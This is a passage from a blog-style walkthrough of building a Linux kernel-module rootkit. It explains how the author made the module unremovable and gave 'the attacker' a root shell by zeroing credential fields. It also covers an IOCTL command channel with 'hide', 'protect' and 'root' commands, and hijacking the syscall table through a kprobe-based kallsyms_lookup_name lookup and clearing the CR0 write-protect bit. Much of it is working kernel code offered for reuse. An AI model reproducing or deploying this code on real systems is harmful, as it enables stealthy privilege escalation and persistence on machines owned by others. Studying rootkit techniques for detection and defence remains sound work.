
/**
 * list_add - add a new entry
 * @new: new entry to be added
 * @head: list head to add it after
 *
 * Insert a new entry after the specified head.
 * This is good for implementing stacks.
 */
static inline void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head-&gt;next);
}
</code></pre>
<hr />
<p>B) <ins>Targeting <em>‚Äú/sys/module/‚Äù</em> directory</ins>:</p>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hide_show_helper.h#L155">sys_module_show_rootkit()</a></p>

<p>I have told you guys/gals earlier in my <a href="https://github.com/reveng007/reveng_rtkit#note">README.md</a> file that I haven‚Äôt used <em>tidy()</em>, <em>sys_module_hide_rootkit()</em> and <em>sys_module_show_rootkit()</em>. Now, I will be discussing about the reasons behind that decision.</p>

<p>Under the title, <a href="https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part2-hiding-lkm-from-lsmod--procmodules-file-prockallsyms-file-and-sysmodulethis_module-directory"><strong>Part2: Hiding LKM from <em>lsmod</em>,  <em>/proc/modules</em> file, <em>/proc/kallsyms</em> file and <em>/sys/module/[THIS_MODULE]/</em> directory</strong></a> in the last para of Targeting <em>/sys/module/</em> directory, I have told that we can‚Äôt re-add our rootkit‚Äôs entry point to the responsible linkedlist once we have removed that particular kernel object of our rootkit LKM.</p>

<p>I will only be explaining the core part related to <em>‚Äú/sys/module/‚Äù</em> here, the <code>IOCTL portion</code> is discussed in the later portion of the blog.</p>

<p>According to <a href="https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf">Page: 7 theswissbay.pdf</a>, the tidy() function is used to do some ‚Äúcleanups‚Äù, i.e., setting some pointers to NULL.</p>

<p>If we don‚Äôt set some pointers to NULL, we can cause Oops during unloading rootkit. This is because, during unloading a module, Kernel will delete entry in <em>/sys/module</em> directory for that module. As we have already deleted that entry, kernel can‚Äôt find that specific entry for our LKM module in <em>/sys/module</em> directory to delete it, therefore kernel can‚Äôt unload our rootkit LKM.
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/unable_to_rmmod.png?raw=true" alt="" /></p>

<p>In this case, tidy() function is not used.</p>

<p>It is the tidy() function, that I have used: <a href="https://theswissbay.ch/pdf/Whitepaper/Writing%20a%20simple%20rootkit%20for%20Linux%20-%20Ormi.pdf">Page: 15 theswissbay.pdf</a></p>

<p>I have implemented the <code>tidy()</code> in the entry function my rtkit.c file (rootkit_init()). Just uncomment <code>tidy()</code> from <a href="https://github.com/reveng007/reveng_rtkit/blob/47dad2e251b80a46999c84507befded6c521933e/kernel_src/reveng_rtkit.c#L111">line:111</a> and <a href="https://github.com/reveng007/reveng_rtkit/blob/47dad2e251b80a46999c84507befded6c521933e/kernel_src/reveng_rtkit.c#L294">line:294</a>.
Then also, I got the same result. 
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/unable_to_rmmod.png?raw=true" alt="" /></p>

<p>I was searching for other ways, like using any function related to kobject. I found out <a href="https://kernel.org/doc/html/latest/driver-api/basics.html#c.kobject_add">kobject_add()</a>, which I have implemented in <a href="https://github.com/reveng007/reveng_rtkit/blob/d9a83f3b94b8aa5206ff46b09b356360ba584649/kernel_src/include/hide_show_helper.h#L155">sys_module_show_rootkit()</a>. Then also I found no result.</p>

<p>This the reason why I have added this <a href="https://github.com/reveng007/reveng_rtkit#note">NOTE</a> in the README.md file of the <strong>reveng_rtkit</strong> repo.</p>

<p>If you viewers have any idea of how to hide our LKM from <code>/sys/module/</code> without creating any discrepancies, in order to deceive usermode programs, please let me know. If I get any other method to get away with this very scenario, I will be updating my LKM rootkit as well as this blog based on that.</p>

<hr />
<h4 id="part4-protecting-lkm-from-from-being-rmmoded-or-unremovable">Part4: <ins>Protecting LKM from from being rmmod‚Äôed (or unremovable)</ins>:</h4>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L165">protect_rootkit()</a>
I took this concept from <a href="https://github.com/nurupo">nurupo‚Äôs</a> repo named: <a href="https://github.com/nurupo/rootkit/blob/56c43b3cc74f0db4739065d9276fcf1236273c5a/rootkit.c#L606">rootkit</a>. We will be using <code>try_module_get()</code> kernel function from <code>module.h</code> library in order to protect our LKM rootkit from being rmmod‚Äôed.</p>

<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: try_module_get

/* This is the Right Way to get a module: if it fails, it's being removed,
 * so pretend it's not there. */
extern bool try_module_get(struct module *module);
</code></pre>
<hr />
<h4 id="part5-making-lkm-removable-from-kernel-incase-needed">Part5: <ins>Making LKM removable from kernel (Incase needed)</ins>:</h4>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L188">remove_rootkit()</a></p>

<p>I also took this concept from <a href="https://github.com/nurupo">nurupo‚Äôs</a> repo named: <a href="https://github.com/nurupo/rootkit/blob/56c43b3cc74f0db4739065d9276fcf1236273c5a/rootkit.c#L622">rootkit</a>. We will be using <code>module_put()</code> kernel function from <code>module.h</code> library in order to protect our LKM rootkit from being rmmod‚Äôed.</p>

<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
// elixir.bootlin: pattern: module_put

extern void module_put(struct module *module);
</code></pre>
<hr />

<h4 id="part6-providing-rootshell-to-the-attacker">Part6: <ins>Providing rootshell to the attacker</ins>:</h4>

<p>Function name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/include/hook_syscall_helper.h#L237">set_root()</a>.</p>

<p>I took this mechanism from <a href="https://xcellerator.github.io/posts/linux_rootkits_03/#changing-credentials">xcellerator-changing-credentials</a> blog post.
I haven‚Äôt followed the whole portion present under the <strong>changing-credentials</strong> title of the xcellerator blog post, I only followed the core part of it.</p>

<p>So, according to Torvald‚Äôs <a href="https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials">documentation</a>, to alter the current process‚Äôs credentials, a function should first prepare a new set of credentials by calling:</p>
<pre><code>struct cred *prepare_creds(void);
</code></pre>
<p>and</p>

<p>When the credential set is ready, it should be committed to the current process by calling:</p>
<pre><code>int commit_creds(struct cred *new);
</code></pre>
<p>So, this implies that we have to work with <code>cred struct</code>, right?</p>
<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
// elixir.bootlin: pattern: cred

struct cred {
		...
	 	kuid_t		uid;		// real UID of the task
	 	kgid_t		gid;		// real GID of the task 
		kuid_t		suid;		// saved UID of the task
	 	kgid_t		sgid;		// saved GID of the task
	 	kuid_t		euid;		// effective UID of the task
	 	kgid_t		egid;		// effective GID of the task
	 	kuid_t		fsuid;		// UID for VFS ops
	 	kgid_t		fsgid;		// GID for VFS ops
	 	...
    };

	...
  extern struct cred *prepare_creds(void);
  ...
  extern int commit_creds(struct cred *);
</code></pre>
<p>We will set all the members of cred struct to zero (=0) to get root shell.</p>

<p>If you now go and check out my code portion, you will understand the scenario.</p>

<hr />

<h4 id="part7-interracting-with-lkm-in-kernel-from-userspace">Part7: <ins>Interracting with LKM in <strong>kernel</strong> from <strong>Userspace</strong></ins>:</h4>

<p>Till now, We all came to know how to do stuff in kernel using LKM rootkit. But how to control the LKM rootkit? how to send command to the rootkit via userspace?</p>

<p>According to my knowledge, it can be done in 2 ways:<br />
A) <code>IOCTL(Input Output ConTroL) method</code><br />
B) <code>Syscall Interception/ Hijacking method</code></p>

<p>I tried my level best to demonstrate both the type of working from my rootkit‚Äôs perspective in a diagrammatic workflow.</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/reveng_rtkit_mechanism.jpeg?raw=true" alt="" /></p>

<p>A) <strong><em><code>IOCTL(Input Output ConTroL) method</code></em></strong>:</p>

<p>File name, where it is implemented in my project: <a href="https://github.com/reveng007/reveng_rtkit/blob/main/kernel_src/reveng_rtkit.c">reveng_rtkit.c</a>.</p>

<p>A brilliant resource related to the theory behind IOCTL is present here: <a href="https://sysprog21.github.io/lkmpg/#talking-to-device-files">sysprog21.github.io-talking-to-device-files-1st_4_paragraphs</a>.</p>

<p>To perform IOCTL, we need two set of C code:<br />
a) <strong><em>LKM with IOCTL features(or Device Driver)</em></strong><br />
b) <strong><em>Usermode C code</em></strong>, in order to communicate with the target <em>LKM</em>.</p>

<p>Basically, a usermode application will be created to communicate with LKM in kernel via a character device file, which will already be <em>registered</em> by our <strong><em>LKM rootkit</em></strong>.<br />
As, Usermode application will only send command to LKM in kernel, it will only perform <code>IOCTL write</code> to the already registered <em>Character Device file</em></p>
<pre><code class="language-c">#define WR_VALUE _IOW('a','a',int32_t*)
...
...
...
ioctl(fd, WR_VALUE, (char*) str);
</code></pre>
<p>and the LKM will perform <code>IOCTL read</code> from the registered <em>Character Device file</em> to read the command and compare those commands with the hardcoded commands which are present in LKM, if those commands satisfies the condition, LKM will show output/message on <em><code>the Kernel Log</code></em>.<br />
I also included the <code>IOCTL write</code> feature to the LKM so that if we (attacker) wants to change/ append some value to the registered Character Device file present in <code>/dev</code> directory named, <code>etx_device</code> externally, we will get to see the notification message being logged in <em><code>the Kernel Log</code></em>.</p>

<p>This LKM will also act as a <strong><em>Device Driver</em></strong> to handle <code>/dev/etx_device</code> Device file, <a href="https://sysprog21.github.io/lkmpg/#registering-a-device">source-1st_para</a>.</p>

<p>The IOCTL portion that is used in my project is taken from Embetronicx <a href="https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c">github</a> repo.</p>

<p>It wasn‚Äôt possible for me to choke out the whole code snippets related to IOCTL to a single place in order to make it easy for the viewers to understand. It will be upon the viewers to look at the code and compare that with the above mentioned link.</p>

<hr />
<h4 id="note-1">NOTE:</h4>
<p>Every Console has log level called as the <strong>Console log level</strong>.<br />
Any message with a log level number <strong>lesser</strong> than the <strong>Console log level</strong> gets <ins>displayed on the Console</ins>.<br />
Eg:<br />
Log level &lt; Console log level<br />
=&gt; log level gets displayed on the console</p>

<p>Other messages with log level &gt;= Console log level, are logged in the kernel log, which can be looked into using command ‚Äúdmesg‚Äù.</p>

<p>The Console log level can be found by:</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog9.png?raw=true" alt="" /></p>

<p>OR,</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog10.png?raw=true" alt="" /></p>

<p>For more information about Linux Log level: <a href="https://linuxconfig.org/introduction-to-the-linux-kernel-log-levels">visit-linuxconfig.org</a>.</p>

<hr />
<p>Let‚Äôs discuss the <strong><em>IOCTL method in LKM</em></strong> bit by bit:<br />
a) Use cases of the libraries that were used for IOCTL purposes:</p>
<pre><code class="language-c">#include &lt;linux/fs.h&gt;           /* Related to file structure */
#include &lt;linux/cdev.h&gt;         /* Character device related stuff */
#include &lt;linux/device.h&gt;       /* device_create() and device_destroy() */
#include &lt;linux/device/class.h&gt; /* class_create() and class_destroy() */
#include &lt;linux/uaccess.h&gt;      /* copy_to_user() and copy_from_user() */
#include &lt;linux/ioctl.h&gt;        /* IOCTL operation */
</code></pre>
<p>Other libraries that were mentioned in Embetronicx <a href="https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c">github</a> repo relating to IOCTL, is not needed according to my knowledge acquired after creating the reveng_rtkit project.\</p>
<h3 id="note-2">NOTE:</h3>
<blockquote>
  <p>If any viewers see, using those omitted libraries are essential, please let me know!</p>
</blockquote>

<p>b) For reading and writing into device files:</p>
<pre><code class="language-c">#define WR_VALUE _IOW('a','a',int32_t*)
#define RD_VALUE _IOR('a','b',int32_t*)
</code></pre>
<p>Format of writing macro to manipulate device file: <code>#define ‚ÄúIOCTL Type‚Äù _IO(num1, num2, argument type)</code>, <a href="https://linuxhint.com/c-ioctl-function-usage/">source</a>.</p>

<p>c) In order to read commands from registered Character Device Driver (i.e. commands which are stored inside Character Device Driver from <ins>Userspace</ins>), I created an array named <strong><code>value</code></strong> with size of MAX_LIMIT(=20) to store it and be compared against those provided/hardcoded commands present in the rootkit.</p>

<pre><code class="language-c">// For size of array
#define MAX_LIMIT 20

// To copy value from userspace
char value[MAX_LIMIT];
</code></pre>
<pre><code class="language-c">// =========================== Available Commands =======================

static char rootkit_hide[] = "hide";            // command to hide rootkit =&gt; In this mode, in no way this rootkit be removable =&gt; rootkit_remove will not work
static char rootkit_show[] = "show";            // command to unhide rootkit =&gt; In this mode, rootkit_protect and rootkit_remove will work effectively
static char rootkit_protect[] = "protect";      // command to make rootkit unremovable (even if it can be seen in usermode).
static char rootkit_remove[] = "remove";        // command to make rootkit removable
static char process[] = "process";              // command to hide/unhide running process/implant
static char root[] = "root";                    // command to get root shell  
</code></pre>
<p>The array named <strong><code>value</code></strong> will be checked against these above mentioned commands, to perform specific tasks.</p>
<pre><code class="language-c">// ======= This function will be called when somebody write IOCTL on the Device file =====

static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
switch(cmd) {
	case WR_VALUE:
	/*
	 * copy_from_user():
	 * - a direct read from the userspace address and write to the kernelspace address
	 * Or, Copy data from User space to Kernel Space
	 */
	if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
	{
		pr_err("Data Write : Err!\n");
	}
	pr_info("               Value got from device file= %s\n", value);
		...
		...
	}
}
</code></pre>
<p>I‚Äôm skipping all those string comparisons present after this snippet, as it is pretty much an easy thing to understand, same as C programming in Usermode.</p>

<p>d) Registering and Unregistering the Character Device:</p>

<p>If you follow my project <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L322">repo</a>, you can get the concept of registering, initializing and unregistering the character device file.</p>

<p>Just declare and intialize these variables, first:</p>
<pre><code class="language-c">// Needed for creating/registering and adding Character device to system
dev_t dev = 0;
static struct class *dev_class;
static struct cdev etx_cdev;
</code></pre>

<p>e) What about <strong><em><code>struct file_operations</code></em></strong>?</p>

<p>In my <a href="https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L81">repo</a>, this portion is also well documented.<br />
This structure is actually essential for interracting with <strong><em><code>Device Files</code></em></strong> by <strong><em><code>Device Drivers</code></em></strong>.</p>
<pre><code class="language-c">static struct file_operations fops =
{
	.owner          = THIS_MODULE,
	.read           = etx_read,
	.write          = etx_write,
	.open           = etx_open,
	.unlocked_ioctl = etx_ioctl,
	.release        = etx_release,
};
</code></pre>
<p>I then made functions named:
	<code>etx_read</code>, it will be triggered when somebody tries to read the Character Device file.
	<code>etx_write</code>, it will be triggered when somebody tries to write into the Character Device file.
	<code>etx_open</code>, it will be triggered when we open the Character Device file.
	<code>etx_release</code>, it will be triggered when we close the Character Device file.
	<code>etx_ioctl</code>, it will be triggered when somebody performs IOCTL onto the Character Device file.</p>

<p>It was all to know about <strong>IOCTL</strong> in <strong>Kernelmode</strong>, now let‚Äôs jump to the <strong><em>Usermode IOCTL method</em></strong>. After knowing the details of Kernelmode IOCTL, <em>Usermode IOCTL</em> will be easy.</p>

<p>The code is present in <a href="https://github.com/reveng007/reveng_rtkit/blob/main/user_src/client_usermode.c">here</a>. I followed Embetronicx <a href="https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/test_app.c">github</a> repo. I don‚Äôt think this code needs that much of explanation to explain it‚Äôs working, it‚Äôs pretty much self-explanatory.</p>

<h3 id="note-3">NOTE:</h3>
<blockquote>
  <p>I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits.</p>
</blockquote>

<p>B) <strong><em><code>Syscall Interception/ Hijacking method</code></em></strong>:</p>

<p>If you are new to the field of systemcall, you can read this intro blog on <a href="https://www.geeksforgeeks.org/introduction-of-system-call/">linux syscalls</a>.</p>

<p>So, I think now you have a little bit of understanding of what systemcall is, right?</p>

<p>We will use, rather misuse systemcall to communicate between usermode and kernel mode and grab our ultimate cookie üç™. This is the main/common thing for which a LKM based rootkit is famous for. There are many methods to perform <strong>Syscall interception</strong> in Linux.</p>

<p>I followed this <a href="https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6">blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall</a> to know all the available linux syscall interception techniques.<br />
I implemented the <strong><em>Syscall table hijacking</em></strong> technique. Personally, I liked the <strong><code>sys_close syscall function</code></strong> technique but the sys_close syscall function is <strong><em>not</em></strong> exported any more since <strong><code>kernel version: 4.17.0</code></strong>(<a href="https://github.com/NoviceLive/research-rootkit/issues/3">Source: sys_close</a>), so discarded.</p>

<p>I found another <a href="https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c">blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking</a> on <em>different</em> types of <strong><em>Syscall table hijacking</em></strong> techniques that are available in the market.<br />
I liked the <strong><code>kallsyms_lookup_name()</code></strong> <strong><em>Syscall table hijacking</em></strong> technique as it is an easy to go solution to perform <ins>hooking</ins>.<br />
But, there is a <em>caveat</em>!</p>

<p>This function is not exported anymore by default from <strong><code>kernel versions: 5.7.0</code></strong> onwards,[<a href="https://github.com/xcellerator/linux_kernel_hacking/issues/3">Source: xcellerator</a>]. We have to make some tweaks to get around this. I will be explaining that soon. Just like <code>kallsyms_lookup_name</code> symbol, <code>sys_call_table</code> is also <strong>not</strong> exported, actually to prevent misuse that we are targeting to make.</p>

<p>I‚Äôm dividing all those steps from getting the <code>address of syscall table</code> to <ins>hooking</ins> <code>individual syscalls</code> pointwise which are discussed in the aforementioned blog post.</p>

<h4 id="step1-finding-the-address-of-the-syscall-table-which-is-represented-by-sys_call_table-symbol">Step1: <ins>Finding the address of the <code>syscall table</code>, which is represented by <code>sys_call_table</code> symbol</ins>.</h4>

<p>So, what the heck is syscall table?<br />
It is actually a table which maps linux syscalls to their corresponding syscall ids which are mapped with their corresponding kernel address.</p>

<p>It is somewhat like this.
<img src="https://docs.microsoft.com/en-us/security/research/project-freta/media/report-kernel-syscalls.png?raw=true" alt="" /></p>

<p>We can see the address of syscall table from <code>/proc/kallsyms</code> file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? if not, please revisit: <a href="https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part1-basics-regrading-lkm-creation">link</a> ).</p>

<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog11.png?raw=true" alt="" /></p>

<p>Why can we see it now, even before loading our module?<br />
=&gt; Very simple, it is already in use by other kernel modules of linux.</p>

<h3 id="note-4">NOTE:</h3>
<pre><code>As all the dynamically loaded kernel module symbols are stored in 
"/proc/kallsyms" file belongs to kernel mode, the executing code 
from usermode has no ability to directly access hardware or 
reference memory. So, use `sudo` or root user to access the 
"/proc/kallsyms" file.
</code></pre>
<p>Now, I think, you can get the idea why I have choosen <strong><code>kallsyms_lookup_name()</code></strong> <strong><em>Syscall table hijacking</em></strong> technique over others. This is because <strong><code>kallsyms_lookup_name()</code></strong> function will find out the address of the syscall table from <code>/proc/kallsyms</code> file and we can also cross-check the result generated by our code with the actual address as shown by <code>/proc/kallsyms</code> file.</p>

<p>Yeah!!! both will basically do the same thing, one is via <code>bash script</code> and other via <code>LKM</code>, but there is always a different level of satisfaction after coding a kernel program correctly üòâ<br />
We will get the address of <code>syscall table</code> via <strong><code>kallsyms_lookup_name()</code></strong> <strong><em>Syscall table hijacking</em></strong> technique, as I mentioned it before.<br />
So now comes the time to show the trick, right?</p>

<p>The trick is basically, we would make our own custom made <code>kallsyms_lookup_name()</code> function using <strong><em>kprobes</em></strong>.</p>

<p>According to this <a href="https://ish-ar.io/kprobes-in-a-nutshell/">blog: ish-ar.io/kprobes-in-a-nutshell</a>:<br />
<strong>kprobe</strong> can be used to <ins>dynamically break</ins> into <em>kernel routine</em> and collect debugging information, i.e. via <strong>dynamically loaded kernel module symbols</strong>.</p>

<pre><code class="language-c">// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
// https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62

struct kprobe {
	...

	/* location of the probe point */
	kprobe_opcode_t *addr;

	/* Allow user to indicate symbol name of the probe point */
	const char *symbol_name;

	...
};
</code></pre>
<p>We gonna need this two functions, one to set the function name, in this case, <code>kallsyms_lookup_name()</code> function and other to get the <code>address of the probe point</code>, i.e., the address of <code>kallsyms_lookup_name symbol</code> and eventually, the <code>address</code> of <code>sys_call_table</code>.</p>

<p>Lets make our code to retrieve the address of the sys_call_table‚Ä¶.</p>

<p>a) Adding necessary libraries.</p>
<pre><code class="language-c">#include &lt;linux/init.h&gt;		/* Needed for the macros */
#include &lt;linux/module.h&gt;	/* Needed by all modules */
#include &lt;linux/kernel.h&gt;	/* Needed for printing log level messages */
#include &lt;linux/kprobes.h&gt;
</code></pre>
<p>b) Setting which <em>dynamic kernel symbol</em> to find by utilizing the kprobe structure that I discussed earlier.</p>
<pre><code class="language-c">static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
</code></pre>
<p>c) The main operation will take place in the entry function.<br />
For storing address of sys_call_table</p>
<pre><code class="language-c">unsigned long *syscall_table;
</code></pre>
<p>As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original <code>kallsyms_lookup_name</code>.</p>

<pre><code class="language-c">/* // Lookup the address for a symbol. Returns 0 if not found.
* unsigned long kallsyms_lookup_name(const char *name);
*/
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name;
</code></pre>
<p>Function, <code>register_kprobe()</code> specifies where the probe is to be inserted and what handler is to be called when the probe is hit.</p>
<pre><code class="language-c">register_kprobe(&amp;kp);
</code></pre>
<p>To get the address of <code>kallsyms_lookup_name</code> symbol. As soon as storing of address of original <code>kallsyms_lookup_name</code> is done. No need of kprobes from now, so unregistering it.</p>
<pre><code class="language-c">kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

unregister_kprobe(&amp;kp);
</code></pre>
<p>As we have got the address of <code>kallsyms_lookup_name</code> symbol, now we can use this to get the address of <code>syscall table</code>.</p>
<pre><code class="language-c">syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
</code></pre>
<p>d) So the full code:</p>
<pre><code class="language-c">#include &lt;linux/init.h&gt;		/* Needed for the macros */
#include &lt;linux/module.h&gt;	/* Needed by all modules */
#include &lt;linux/kernel.h&gt;	/* Needed for printing log level messages */
#include &lt;linux/kprobes.h&gt;

// Setting which dynamic kernel symbol to find
  static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
  };

  // =================== Entry Function ====================

static int __init rootkit_init(void)
{
	// For storing address of sys_call_table
	unsigned long *syscall_table;

	// Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (&gt;5.7)

	/* // Lookup the address for a symbol. Returns 0 if not found.
	 * unsigned long kallsyms_lookup_name(const char *name);
	 */
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

	kallsyms_lookup_name_t kallsyms_lookup_name;

	// register_kprobe() specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
	register_kprobe(&amp;kp);

       /*
    * // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
    * // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
    *
    * struct kprobe {
    *       ...
    *
    *       // location of the probe point
    *       kprobe_opcode_t *addr;
    *
    *       // Allow user to indicate symbol name of the probe point
    *       const char *symbol_name;
            *
            * 	      ...
            * 	};
            */
	
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;


	// Storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now.
	unregister_kprobe(&amp;kp);

	// Storing the address of the syscall table
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

	if (!syscall_table)
		return -1;

	printk(KERN_INFO "[+] reveng_rtkit: Address of kallsyms_lookup_name in kernel memory: 0x%px \n", kallsyms_lookup_name);
	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", syscall_table);

	return 0;
}

// ========================== Exit Function ====================

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
	printk(KERN_INFO "=================================================\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("reveng007");
MODULE_DESCRIPTION("Demo syscall table hijaking");
MODULE_VERSION("1.0");
</code></pre>
<h4 id="output">Output:</h4>
<p><img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog12.png?raw=true" alt="" />
Now, we can export both <code>kallsyms_lookup_name</code> as well as <code>sys_call_table</code>! üòâ.</p>

<h4 id="step2-disabling-the-wpwrite-protection-flag-in-the-control-register">Step2: <ins>Disabling the WP(write protection) flag in the control register</ins>.</h4>

<p>Before modifying the <code>syscall table</code>, we first need to disable the WP(write protection) flag in the control register (or cr0 reg) in order to make syscall table editable/writable, from read-only mode.</p>

<p>According to <a href="https://sysprog21.github.io/lkmpg/#system-calls">sysprog21.github.io/lkmpg/#system-calls</a>:<br />
<em>Control register (or cr0 reg) is a processor register that changes or controls the general behavior of the CPU. For x86 architecture, the cr0 register has various control flags that modify the basic operation of the processor. The WP flag in cr0 stands for write protection. Once the WP flag is set, the processor disallows further write attempts to the read-only sections.</em></p>

<p>Therefore, we must disable the WP flag before modifying sys_call_table. =&gt; <strong><em><code>WP flag must be set to 0</code></em></strong>.</p>

<p>a) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/72a939257c42562222b2b4c0785c46997cb4e1d1/kernel_src/reveng_rtkit.c#L308">repo</a>.<br />
      Reading the status/state of cr0 register.</p>
<pre><code class="language-c">cr0 = read_cr0();
</code></pre>
<h4 id="note-5">NOTE:</h4>
<pre><code>read_cr0(): Reading the status/state of cr0 register.
write_cr0(): Writing to the cr0 register.
</code></pre>
<p>b) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L310">repo</a>.</p>

<p>Setting WP flag in cr0 register to <code>zero</code>. But how to do it?<br />
According to <a href="https://hadfiabdelmoumene.medium.com/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411">change-value-of-wp-bit-in-cr0</a>:<br />
As we are already in ring-0 ,i.e. in kernel mode, we already can write directly to cr0 registry and we don‚Äôt need to call write_cr0() function.<br />
We will be using <strong><em>this function</em></strong> to <strong>write in cr0 register</strong> instead of standard <code>write_cr0() function</code>.</p>

<p>Here, <code>__force_order</code> is used to force instruction serialization.</p>
<pre><code class="language-c">static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}
</code></pre>
<p>Yes!!, <code>asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order))</code> is <strong>inline assembly</strong> implementation in C (Linux Kernel Programming), more specifically, <strong>extended inline assembly implementation</strong>.</p>

<p>c) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L323">repo</a></p>

<p>Now, we will be using this function, <code>write_cr0_forced</code> to set WP flag to zero in cr0 register.</p>
<pre><code class="language-c">static inline void unprotect_memory(void)
{
	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
	write_cr0_forced(cr0 &amp; ~0x00010000);    // Setting WP flag to 0 =&gt; writable
}
</code></pre>
<h4 id="step3-performing-the-actual-hooking">Step3: <ins>Performing the actual hooking</ins>.</h4>

<p>According to this <a href="https://xcellerator.github.io/posts/linux_rootkits_02/#how-the-kernel-handles-syscalls">blog</a>:<br />
The arguments that we pass from usermode are stored in registers (if you have done some RE, you should have known that, right?), then this values are stored in a special struct called <a href="https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12">pt_regs</a>, which is then passed to the syscall, then syscall performs its work and go through the members of the passed stucture in which it is interested in.</p>

<p>So, =&gt; We gonna need pt_regs to do our shit!</p>

<p>I actually intercepted two syscalls:<br />
a) <ins><strong>kill syscall</strong></ins>: <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L708">elixir.bootlin</a></p>

<p>Took this from <a href="https://xcellerator.github.io/posts/linux_rootkits_03/">xcellerator</a>. In this blog, <em>‚Äúthe ftrace helper method‚Äù</em> is implemented, instead of that I will be using <em>‚Äúthe syscall table hijacking method‚Äù</em> to perform the same syscall interception. I just want you guys/gals to go through the aforementioned blog once (from <a href="https://xcellerator.github.io/posts/linux_rootkits_03/">top</a> till <a href="https://xcellerator.github.io/posts/linux_rootkits_03/#hooking-kill"><em>Hooking Kill</em></a> portion) before going on with this blog. It will help you as I have took most of the <code>syscall interception</code> portion from that blog apart from <em>‚Äúthe syscall table hijacking method‚Äù</em>.</p>

<p>Now, it‚Äôs time to perform hooking.<br />
But, what is hooking exactly?<br />
